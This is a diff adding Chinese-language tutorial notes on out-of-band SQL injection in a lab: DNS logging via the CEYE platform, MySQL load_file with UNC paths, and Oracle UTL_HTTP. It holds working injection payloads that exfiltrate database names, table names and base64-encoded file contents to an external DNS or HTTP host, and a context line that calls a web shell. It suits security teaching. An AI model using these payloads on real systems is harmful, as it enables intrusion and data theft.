@@ -1849,6 +1849,279 @@ curl -d "hacker=echo getcwd();" http://127.0.0.1/images/shell.php
 
 ### OOB 注入
 
+#### SQL注入的不同类型 
+
+- SQL注入主要分为以下5种
+
+  - Error-based SQL injection（报错型注入）
+  - UNION query SQL injection（可联合查询注入）
+  - Boolean-based blind SQL injection（布尔型注入）
+  - Time-based blind SQL injection（基于时间延迟注入）
+  - Stacked queries SQL injection（可多语句查询注入） 
+
+- SQL 注入的 5 种类型 ---> 进一步抽象 
+
+  - | 攻击类别    | SQL注入类型                                                  | 说明                                                 |
+    | ----------- | ------------------------------------------------------------ | ---------------------------------------------------- |
+    | INBAND      | Error-based Injecction <br />UNION query Injection           | 在应用内直接获取数据，通过应用的返回或者报错提取数据 |
+    | INFERENCE   | Boolean-based Blind Injection <br />Time-based Blind Injection | 通过应用的非直接数据反馈进行推断                     |
+    | OUT OF BAND | OOB SQL Injection                                            | 通过其他**信道**获得数据                             |
+
+
+
+#### OOB 定义 
+
+- 带外通道技术（Out-Of-Band） 
+  - 带外通道技术(OOB)让攻击者能够通过另一种方式来确认和利用没有直接回显的漏洞。
+  - 这一类漏洞中，攻击者无法通过恶意请求直接在响应包中看到漏洞的输出结果。
+  - 带外通道技术通常需要脆弱的实体来生成带外的TCP/UDP/ICMP请求，然后，攻击者可以通过这个请求来提取数据。 
+- 一次OOB攻击能够成功是基于：
+  1. 存在漏洞的系统；
+  2. 外围防火墙的出站请求。 
+
+
+
+#### OOB v.s. Inband 
+
+- Inband（常规通信信道）
+
+![1617261728018](HackerMeWeb.assets/1617261728018.png)
+
+- OOB（非应用内信道） 
+
+![1617261759739](HackerMeWeb.assets/1617261759739.png)
+
+
+
+#### OOB v.s. Time-based Blind Injection 
+
+- 带外通道技术（Out-Of-Band） 
+  - 可以看做是另一种盲注技术；
+  - 与盲注相比，**速度**具有优势，因为其实际上实现了**变相的回显**。 
+
+
+
+#### DNS 迭代查询原理 
+
+- DNS 协议 
+
+  - 域名系统（Domain Name System，缩写：DNS）是互联网的一项服务。它作为将域名和 IP 地址相互映射的一个**分布式数据库**，能够使人更方便地访问互联网。
+  - DNS 使用 TCP 和 UDP 端口 **53**。
+  - 当前，对于每一级域名长度的限制是 63 个字符，域名总长度则不能超过 253个字符。 
+- DNS迭代查询原理 
+
+  - 首先有一个可以配置的域名test.com。
+  - 通过**代理商**设置域名test.com的nameserver为自己拥有的服务器（S）的IP。
+  - 然后在S上搭建DNS Server。
+  - 这样 test.com及其所有子域名的查询都会推送到S上，同时S也能够实时的**监控**针对test.com的查询请求。  
+  
+- DNS 查询
+  - DNS 是域名解析系统，它的功能是将站点的域名转换为站点的 IP 地址。 
+- DNS 查询-递归查询 
+  - 根DNS服务器：只有 13 台根服务器（准确来说是13个IP），通过根服务器可以查询域名所属的顶级服务器
+  - 顶级DNS服务器：顶级服务器对应一个顶级域名，如 com/net/org/cn/edu/...，通过顶级域名服务器，可以查询二级域
+  - 权威DNS服务器：权威服务器对应二级域，如qq.com/yahoo.com/poly.edu/...
+
+![1617266108794](HackerMeWeb.assets/1617266108794.png)
+
+- 泛域名解析
+  - 泛域名解析就是利用通配符的方式将所有的次级域名指向同一 IP。
+  - www.example.com 和 abc.example.com 都会**访问到同一个站点**。
+  - 在注册域名并配置域名解析的时候，在 DNS 服务器中配置了下面的记录。 
+  - *.example.com   --- >  IP
+
+
+
+
+
+#### tcpdump 
+
+
+  - 基于Unix系统的命令行的数据报嗅探工具，可以抓取流动在网卡上的**数据包**。
+  - 原理：
+    - Linux抓包是通过注册一种**虚拟的底层网络协议**来完成对网络报文（准确的是网络设备）消息的处理权。
+    - 系统在收到报文的时候就会给这个伪协议**一次机会**，让它对网卡收到的报文进行一次处理，此时该模块就会**趁机**对报文进行窥探。 
+- tcpdump –n port 53 
+
+  - 备注：如果权限不够，使用：sudo tcpdump –n port 53 
+
+
+
+#### UNC路径 
+
+- UNC路径 
+  - UNC (Universal Naming Convention) /通用命名规则。
+  - Windows主机默认存在，Linux主机默认不存在。格式：`\\servername\sharename`，其中servername是服务器名。sharename是共享资源的名称。
+  - 我们平时使用的打印机、网络共享文件夹时，都会用到UNC填写地址。并且当我们在使用UNC路径时，会对域名进行DNS查询。 
+  - 注意：UNC 路径只能在 Windows 系统中生效。 
+- widows  UNC路径  测试
+  - 第一个 windows 系统，创建一个文件夹，创建一个文件，写上内容
+  - 点击文件夹的属性，进入共享，点击共享（S）,选择 Everyone，点击共享，弹出框点击确定
+  - 记住地址，`\\DESKTOP-6F8M9D7\share_test`
+  - 看下面的密码保护，点击网络和共享中心，弹出框，下拉到最下面 密码保护的共享，点击关闭密码保护共享。
+  - 第二个电脑，直接在网络中，输入上面的地址就可以看到对应的文件夹，但是没有权限看到里面的内容，但是在本机的网络中可以开电脑所有的内容
+
+
+
+#### CEYE 平台 
+
+- 官网：http://ceye.io/
+  - CEYE 可以监控 DNS 请求，并且配置了泛域名解析。 
+- CEYE 平台
+  - 使用 CEYE 平台首先需要注册账号（ceye.io）。（备注：可以直接使用微信登录）
+  - 注册成功并登录该平台后，在 [profile 页面](http://ceye.io/profile)可以看到分配给你的域名：Identifier --> fehmp3.ceye.io。 
+  - 测试泛域名解析
+    - 本机命令行，ping fehmp3.ceye.io，可以看到正常的ping通
+    - 在 profile 页面中，点击 NDS Query，可以看到 刚刚 ping 的请求记录
+    - 本机命令行，ping test.fehmp3.ceye.io，可以看到正常的ping通
+    - 在 NDS Query中，点击 Reload ，可以看到新的 ping 请求记录
+
+
+
+#### phpstudy
+
+- 软件安装
+  - 本靶场需要在 Windows 环境下搭建，在软件目录下提供了一键搭建WNMP/WAMP环境的软件。
+  - 根据自己的系统选择合适的phpstudy，解压后直接安装即可（傻瓜式安装）。
+  - 如果提示缺少运行库，可以在phpstudyVC9-14(32位和64位)运行库中找到自己需要的库双击安装即可。
+  - 安装成功后，一键启动服务，然后将靶场代码放到网站根目录下即可。 
+
+- 切换PHP环境 
+  - phpstudy 安装完成后，直接双击打开
+  - 点击首页 >>> 套件 >>> 启动（Apache2.4.39 和 MySQL5.7.26）
+  - 点击环境 >>> 工具 >>> php >>> 安装 >>> php5.2.17版本
+  - 点击网站 >>> 管理 >>> php版本 >>> 选择 php5.2.17版本
+
+
+
+#### MySQL root远程登录 
+
+- 安装数据库工具（客户端）
+  - 点击环境 >>> 工具 >>> 数据库工具（客户端）>>> 安装 >>> 点击管理 >>> 弹出新窗口 >>> 点击打开登录信息（打开） >>> 跳出数据库登录 >>> 输入用户名 root >>>  输入密码 root（密码从点击数据库 >>> 鼠标悬停在密码上就会显示出来） >>> 确定登录 >>> 登录成功
+- 允许 MySQL root远程登录 
+  - 在数据库工具（客户端）登录成功中，点击 SQL 编辑器，输入下面的SQL
+  - show databases;
+  - use mysql;
+  - select database();
+  - grant all privileges on *.* to root@'%' identified by '密码(我这里替换成root)';
+  - flush privileges; 
+  - 此时就可以通过局域网的另一台电脑访问
+    - 输入mysql -h 192.168.1.102（换成自己的IP） -u root -p
+    - 密码 root
+    - 连接成功
+- 回忆盲注的时候，需要使用 ascii码进行一个一个的试一试
+  - ascii(substr(database(),1,1))=32
+  - ascii(substr(database(),2,1))=32
+  - ascii(substr(database(),3,1))=32 
+- 想一下带外注入，OOB的好处
+  - 带外注入可以简化盲注的过程，可以直接将查询到的结果通过 DNS 记录显示出来。 
+
+
+
+####  load_file 函数
+
+- 学习MySQL的 load_file 函数
+  - load_file() 函数是 MySQL 中一个常用的函数，主要用来读取文件内容。
+  - 函数原型：load_file(file_path)
+  - 该函数会读取文件内容，并将文件内容作为字符串返回。如果读取失败会返回 NULL。 
+  - 该函数在执行过程中需要遵循 secure_file_priv 的限制，如果直接执行 ，load_file() 函数在读取目标文件内容的时候失败了。 
+    - 在本地创建一个 文件夹，echo 221232 > test.txt
+    - 连接MySQL，输入 select load_file("/tmp/test.txt") as result;
+    - 读取失败，结果为 NULL
+  - 分析失败原因
+    - 执行命令，show global variables like "%secure_file_priv%";
+    - 看到 value 是 /var/lib/mysql-files/，表示secure_file_priv 变量的值为 /var/lib/mysql-files，因此load_file() 函数只能够读取该目录下的文件的内容。 
+    - 可以在  /var/lib/mysql-files/ 文件下创建文件，进行 load_file 函数测试
+  - 如果想要完成任意目录下文件读取需要在 /etc/my.conf(my.ini) 中将 secure_file_priv 的值置为空。 
+    - 在 phpstudy 中，点击 设置  >>> 配置文件 >>> mysql.ini >>> 点击 MySQL5.7.26 >>> 打开本地记事本 >>> 在[mysqld]下面新增加 secure_file_priv=  >>> 保存 >>> 关闭记事本
+    - 点击 首页 >>> 套件 >>> MySQL5.7.26 >>> 点击 重启
+    - 完成上面的配置并重新启动 MySQL 后，重新连接mysql，
+    - 执行命令，show global variables like "%secure_file_priv%";
+    - 此时的 secure_file_priv 的值变成了空。 
+    - 并且可以访问任何目录下的文件内容
+  - 测试访问任何目录的文件
+    - 远程连接 MySQL
+    - 输入 select load_file("D:/phpstudy_pro/1.txt") as result;
+    - 得到输出结果
+    - 也可以输入 select load_file("C:Users/rmliu/Desktop/test.txt") as result;
+
+
+
+
+
+#### OOB 注入实战
+
+- 连接数据库，测试
+  - mysql -h 192.168.1.102 -u root -p root
+  - use mysql;
+  - select database();
+  - `select concat('\\\\',(select database()), '.fehmp3.ceye.io');`
+    - 此时可以拼接处整个 UNC 的访问路径，\\mysql.fehmp3.ceye.io
+  - 测试为什么使用四个 \，分别输入一个\，两个\
+    - `select concat('\\\\',(select database()), '.fehmp3.ceye.io\123');`
+    - `select concat('\\\\',(select database()), '.fehmp3.ceye.io\\123');`
+- 使用 load_file 测试是否进行 DNS 访问
+  - 输入，`select load_file(concat('\\\\',(select database()), '.fehmp3.ceye.io'));`
+  - 此时到，http://ceye.io/records/dns 中，查看 DNS Query，刷新 Reload 可以看到有访问记录，在 name 栏目看到对应的数据库名字是 mysql
+  - load_file 函数除了能够读取本机文件还可以通过 UNC 路径读取远程机器上的文件 
+- SQL 注入 获取数据库名
+  - `?id=1' and load_file(concat("\\\\",(select database()), ".fehmp3.ceye.io\\abc")) --+ `
+- QL 注入 获取表名
+  - `?id=1' and load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema='security' limit 0,1),".7as54b.ceye.io\\abc")) --+ `
+
+
+
+#### 大文本传输 
+
+- 域名 的限制
+  - www . example . com
+  - 域名由标签组成，以点（.）分隔，标签的长度不可以超过 63 个字符。
+  - 整个域名不可以超过 253 个字符，包括点（.）。 
+- `select concat(to_base64(substr(load_file("D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\my.ini"),1,15)),".fehmp3.ceye.io") as result;`
+  - 使用 load_file 读取文件内容
+  - 使用 substr 对文件内容进行切片
+  - 使用 to_base64 对切片的内容进行编码
+  - 使用 concat 将编码后的内容与域名进行拼接，得到 W215c3FsXQ0KZGVmYXVs.fehmp3.ceye.io
+  - 使用 load_file 访问该 UNC 路径 
+
+
+
+#### HTTP 带外注入 
+
+- UTL_HTTP.request
+
+  - UTL_HTTP.REQUEST ( url IN VARCHAR2, proxy IN VARCHAR2 DEFAULT NULL);
+    - url：目标服务器地址
+    - porxy：代理服务器地址，该参数为可选参数
+  - 它的返回类型是长度为 2000 或更短的字符串，它包含从 HTTP 请求返回到参数 URL 的HTML 结果的前 2000 个字节。 
+
+- 环境介绍 
+
+  ![1617280278201](HackerMeWeb.assets/1617280278201.png)
+
+-  通过 SQL 注入让目标服务器执行
+
+  - select UTL_HTTP.request('http://192.168.25.166/test.php'||'?id='||(select version from v$instance)) from dual;
+  - 此时 Oracle 发起 HTTP 请求
+  - 在 192.168.25.166 上的 test.php 会记录传递来的数据，并写入 test.txt 文件中。
+  - 通过 tail -f test.txt 获得文件中的数据 
+
+
+
+
+
+### 混淆及绕过注入
+
+
+
+
+
+
+
+
+
+
+
 
 
 
